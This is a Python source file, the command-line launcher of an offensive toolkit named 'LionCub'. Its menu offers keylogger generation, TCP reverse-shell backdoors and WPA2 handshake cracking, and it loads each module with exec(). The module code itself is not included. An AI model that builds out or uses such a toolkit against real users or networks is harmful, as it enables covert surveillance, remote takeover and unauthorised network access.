from terminaltables import AsciiTable
from os.path import dirname, realpath
from libs.colors import COLORS
from os import system
from libs.logo import PrintLogo

colors = COLORS()
program_path = dirname(realpath(__file__))
graphic_printer = PrintLogo(program_path)
activated_option = [f'{colors.Red}@{colors.RESET}LionCub']

global_dict = {
    'program_path' : program_path,
    'activated_option' : activated_option
}

def execfile_y(file_name, globals_variables):
    """
    file_name: this is the name of the file name to be executed
    global_variables: this is a dectionary of global variables to be passed
    """
    exec(compile(open(file_name, "rb").read(), file_name, 'exec'), globals_variables)


def print_main_options():
    options = {
        'keylogger': 'You can generate and pull information from keyloggers',
        'backdoor': 'You can generate and listen to tcp reverse shells',
        'wpa2': 'You can capture handshakes and crack them'
    }

    table_data = [[colors.BOLD + 'Option', colors.BOLD + 'Description' + colors.RESET]]
    for option in options:
        row_data = [option, options[option]]
        table_data.append(row_data)

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def main():
    """
    DOCSTRING: this is the main program thi program will loop over withcommands
    """
    global global_dict
    global activated_option
    global program_path

    system('clear')
    graphic_printer.print()

    while True:
        # Input the command
        command = input("".join(activated_option) + ' > ')

        if command == 'options' or command == 'show options':
            print_main_options()

        elif command == 'exit' or command == 'quit':
            break

        elif command == 'clear':
            system('clear')

        elif command == '' or command == ' ':
            pass

        else:

            try:
                command = command.split()

                if command[0] == 'use':
                    using_option = command[1]

                    try:
                        activated_option.append(f'/{using_option}')
                        execfile_y(f'sub_frames/{using_option}.py', global_dict)
                    except:
                        activated_option.remove(f'/{using_option}')
                        print(colors.Red + "[✘]Invalid option" + colors.RESET)
        
                else:
                   print(colors.Red + "[✘]Invalid Command use 'help' command to view help" + colors.RESET) 

            except:
                print(colors.Red + "[✘]Invalid Command use 'help' command to view help" + colors.RESET)
         
            
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colors.Green + '\n[✓] Lion Cub quits' + colors.RESET, end='\n\n\n')
        exit(0)